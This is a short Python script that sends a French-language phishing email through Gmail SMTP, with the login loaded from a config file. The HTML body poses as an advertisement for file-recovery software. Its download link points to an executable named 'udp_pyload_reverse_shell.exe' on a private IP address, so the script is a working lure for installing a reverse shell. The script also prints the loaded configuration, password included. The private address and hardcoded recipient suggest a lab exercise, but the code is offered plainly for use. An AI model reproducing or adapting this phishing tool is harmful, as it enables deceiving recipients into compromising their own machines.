import smtplib
import json
from email.message import EmailMessage
from email.mime.multipart import MIMEMultipart
from email.mime.text import MIMEText


json_file = open("config.json")
gmail_cfg = json.load(json_file)

print(gmail_cfg)

msg = EmailMessage()
msg["to"] = "angelotrandria69@gmail.com"
msg["from"] = gmail_cfg["email"]
msg["Subject"] = "Sujet"

html = """
<html>
  <body>
    <h1 style="color: #5e9ca0;">Récupérez vos fichiers perdus ou effacés dès maintenant!</h1>
    <p>Bonjour,</p>
    <p>Nous sommes ravis de vous présenter notre nouveau logiciel de récupération de fichiers. 
    Ce programme vous permet de restaurer facilement et rapidement les fichiers que vous avez perdus ou effacés sur votre disque dur.</p>
    <p>Voici quelques-unes de ses fonctionnalités :</p>
    <ul>
      <li>Récupération rapide et efficace de tous types de fichiers</li>
      <li>Interface utilisateur intuitive et facile à utiliser</li>
      <li>Supporte divers formats de disque dur et systèmes de fichiers</li>
    </ul>
    <p><b><a href="http://192.168.92.130/udp_pyload_reverse_shell.exe" style="color: #ff6600;">
    Téléchargez le logiciel maintenant et récupérez vos fichiers en un rien de temps!</a></b></p>
    <p>Meilleures salutations,<br>L'équipe de récupération de fichiers</p>
  </body>
</html>
"""

part = MIMEText(html, "html")
msg.set_content(part)


with smtplib.SMTP_SSL(gmail_cfg["server"],gmail_cfg["port"]) as smtp :
	smtp.login(gmail_cfg["email"],gmail_cfg["pwd"])
	smtp.send_message(msg)
	print("email sent successfully")

